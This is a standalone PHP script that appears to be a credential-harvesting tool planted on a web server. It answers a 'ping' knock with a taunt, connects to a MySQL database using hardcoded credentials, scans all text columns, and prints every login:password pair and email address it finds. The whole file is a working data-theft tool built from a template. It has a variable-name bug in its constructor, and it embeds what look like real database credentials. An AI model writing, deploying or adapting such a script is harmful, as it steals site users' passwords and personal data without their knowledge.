<?php
	set_time_limit(0);	
	if (isset($_GET["ping"])) {
		die("KNOCK-KNOCK-MUZUFACKA");
	}
	class database {
		var $con;
		private $result;
		private $driver;
		var $sql;
		var $rows;
		var $error;
		var $id;
		var $textColumns, $textTables;
		private $debugFile = "";
		private $dbase;
		var $columns = array();

		function __construct ($dbhosts, $dbuser, $dbpass, $dbase, $driver="mysqli", $utf=true) {
			$this->driver = $driver;
			$this->con = @mysqli_connect($dbhost, $dbuser, $dbpass, $dbase) or Die (mysqli_connect_error());
			switch ($this->driver) {
				case "mysqli" : {
					$this->dbase = $dbase;
					if ($utf) {
						mysqli_query($this->con, "SET NAMES UTF8");
						mysqli_query($this->con, "SET CHARACTER SET UTF8");
					}
					break;
				}
			}
		}

		function query ($sql = "", $nodebug = true) {
			if (!$nodebug) {
				Die ($sql);
			}
			$mt_start = microtime(true);
			$this->error = "";
			$this->id = $this->rows = -1;
			$ret = false;
			if (!$sql)
				$sql = $this->sql;
			else
				$this->sql = $sql;
			if ($this->sql) {
				if ($this->debugFile) {
					$msg = "SQL: $sql";
					$this->writeDebug($msg);
				}
				switch ($this->driver) {
					case "mysqli" : {
						if (!$this->result = mysqli_query($this->con, $this->sql))
							$this->error = mysqli_error($this->con)." \nRAISED SQL: {$sql}";
						else
						{                           
							$tmp = explode(PHP_EOL, strtoupper(trim($this->sql)));
							$tmp = is_array($tmp) ? explode(" ", strtoupper(trim($tmp[0]))) : explode(" ", strtoupper(trim($tmp)));
							if ($tmp[0] == "INSERT")
								$this->id = mysqli_insert_id($this->con);
							if ($tmp[0] == "SELECT")
								$this->rows = mysqli_num_rows($this->result); 
							$ret = true;
						}
						break;
					}
				}
			} else {
				$this->error = "Error: Empty SQL";
			}
			$mt_end = microtime(true);
			$mt_diff = round($mt_end - $mt_start, 8);
			if ($this->debugFile) {
				$msg = "";
				if ($this->result) {
					if ($this->isSelectSQL($sql)) {
						$msg = "FETCHED ROWS: ".mysqli_num_rows($this->result);
					} else {
						$msg = "AFFECTED ROWS: ".mysqli_affected_rows($this->con);
					}
				} else {
					$msg = "ERROR: ".mysqli_error($this->con);
				}
				$msg .= "\nEXECUTION TIME: ".$mt_diff." sec.";
				$this->writeDebug($msg, false);
			}
			return $ret;
		}

		function fetch () {
			switch ($this->driver) {
				case "mysqli" : {
					if ($res = mysqli_fetch_assoc($this->result)) {
						$this->error = "";
						return $res;
					} else {
						$this->error = mysqli_error($this->con);
						return false;
					}
					break;
				}
			}
		}

		function fetchAll () {
			switch ($this->driver) {
				case "mysqli" : {
					$result = array();
					while ($res = $this->fetch())
						$result[] = $res;
					return $result;
				}
			}
		}

		function aquery ($sql, $nodebug = true) {
			if (!$nodebug) {
				Die ($sql);
			}
			switch ($this->driver) {
				case "mysqli" : {
					if ($this->debugFile) {
						$msg = "SQL: $sql";
						$this->writeDebug($msg);
					}
					$mt_start = microtime(true);
					$result = mysqli_query($this->con, $sql);
					$mt_end = microtime(true);
					$mt_diff = round($mt_end - $mt_start, 8);
					if ($this->debugFile) {
						$msg = "";
						if ($result) {
							if ($this->isSelectSQL($sql)) {
								$msg .= "FETCHED ROWS: ".mysqli_num_rows($result);
							} else {
								$msg .= "AFFECTED ROWS: ".mysqli_affected_rows($this->con);
							}
						} else {
							$msg .= "ERROR: ".mysqli_error($this->con)." \nRAISED SQL: {$sql}";
						}
						$msg .= "\nEXECUTION TIME: ".$mt_diff." sec.";
						$this->writeDebug($msg, false);
					}
					return $result;
				}
			}
		}

		function aerror () {
			switch ($this->driver) {
				case "mysqli" : {
					return mysqli_error($this->con);
				}
			}
		}

		function afetch ($result) {
			switch ($this->driver) {
				case "mysqli" : {
					return mysqli_fetch_assoc($result);
				}
			}
		}

		function aid () {
			switch ($this->driver) {
				case "mysqli" : {
					return mysqli_insert_id($this->con);
				}
			}
		}

		function arows($result) {
			switch ($this->driver) {
				case "mysqli" : {
					return mysqli_num_rows($result);
				}
			}
		}

		function escape($str) {  
			return mysqli_real_escape_string($this->con, $str);
		}


		function isSelectSQL ($sql) {
			$tmp = explode(PHP_EOL, strtoupper(trim($sql)));
			$tmp = is_array($tmp) ? explode(" ", strtoupper(trim($tmp[0]))) : explode(" ", strtoupper(trim($tmp)));
			return ($tmp[0] == "SELECT");
		}

		function findPasswordFields($fld, $loginMasks, $passwordMasks) {
			if (!$loginMasks || !$passwordMasks) {
				return false;
			}
			$fLogin = $fPassword = "";
			foreach ($fld as $fl) {
				foreach ($loginMasks as $m) {
					if (preg_match("/{$m}/i", $fl)) {
						$fLogin = $fl;
						break;
					}
				}
				foreach ($passwordMasks as $m) {
					if (preg_match("/{$m}/i", $fl)) {
						$fPassword = $fl;
						break;
					}
				}
			}
			return ($fLogin && $fPassword) ? array("login" => $fLogin, "pwd" => $fPassword) : false;
		}

		function findTextColumns (){
			$this->textColumns = $this->textTables = array();
			if ($this->query("SELECT 
												TABLE_NAME, 
												COLUMN_NAME, 
												DATA_TYPE,
												CHARACTER_MAXIMUM_LENGTH 
											FROM 
												information_schema.COLUMNS
											WHERE
												TABLE_SCHEMA='{$this->dbase}'
											ORDER BY
												TABLE_NAME")) {
				while ($r = $this->fetch()) {
					if (preg_match("/(text|char)$/i", $r["DATA_TYPE"])) {
						if (is_null($r["CHARACTER_MAXIMUM_LENGTH"]) || ($r["CHARACTER_MAXIMUM_LENGTH"]>10)) {
							$this->textColumns[$r["TABLE_NAME"]][$r["COLUMN_NAME"]] = $r["COLUMN_NAME"];
							$this->textTables[$r["TABLE_NAME"]] = $r["TABLE_NAME"];
						}
					}
				}
			}
		}
	}

	$db = new database("localhost", "edftkf325_622f5476b9375", "2400c6d5c07786f11efca03f690e8aa5", "edftkf325_administra2020");
	$db->findTextColumns();

	$verbose = false;
	if ("") {
		if (!$f = fopen("", "w+")) {
			if ($verbose) {
				$err = error_get_last();
				Die ("Error: ".$err["message"]."\n");
			}
		}
	}
	if ("") {
		if (!$p = fopen("", "w+")) {
			if ($verbose) {
				$err = error_get_last();
				Die ("Error: ".$err["message"]."\n");
			}
		}
	}

	$aLoginMasks = $aPwdMasks = array();
	if (".+mail.+|.+login.+|.+user.+") {
		$aLoginMasks = explode("|", ".+mail.+|.+login.+|.+user.+");
	}

	if (".+pass.+|.+pw.+") {
		$aPwdMasks = explode("|", ".+pass.+|.+pw.+");
	}

	$emails = $logpwd = array();
	foreach ($db->textTables as $tbl) {
		$fld = implode (", ", $db->textColumns[$tbl]);
		if ($verbose) {
			print "Processing table '{$tbl}' with fields '{$fld}'...\n";
		}
		$pwd = $db->findPasswordFields($db->textColumns[$tbl], $aLoginMasks, $aPwdMasks);
		if ($pwd && $verbose) {
			print "Treating {$pwd["login"]}:{$pwd["pwd"]} as login:password fields\n";
		}
		if ($db->query ("SELECT {$fld} FROM {$tbl}")) {
			while ($r = $db->fetch()) {
				foreach ($r as $txt) {
					if ($pwd) {
						$vLogin = $r[$pwd["login"]];
						$vPwd = $r[$pwd["pwd"]];
						$pmd5 = md5($vLogin.$vPwd);
						if (!isset($logpwd[$pmd5])) {
							$logpwd[$pmd5] = true;
							if ("") {
								fputs($p, $vLogin.":".$vPwd."\n");
							} else {
								print "[L:P]".$vLogin.":".$vPwd."\n";
							}
						}
					}
					if (preg_match_all("/(\w+[\w-\.]*\@\w+((-\w+)|(\w*))\.[a-z]{2,10})/i", $txt, $rg)) {
						foreach ($rg[1] as $email) {
							$md5 = md5($email);
							if (!isset($emails[$md5])) {
								$emails[$md5] = true;
								if ("") {
									fputs($f, $email."\n");
								} else {
									print "[EMAIL]".$email."\n";
								}
							}
						}
					}
				}
			}
		}
	}
	if (isset($f) && $f) {
		fclose ($f);
	}
	if (isset($p) && $p) {
		fclose ($p);
	}
?>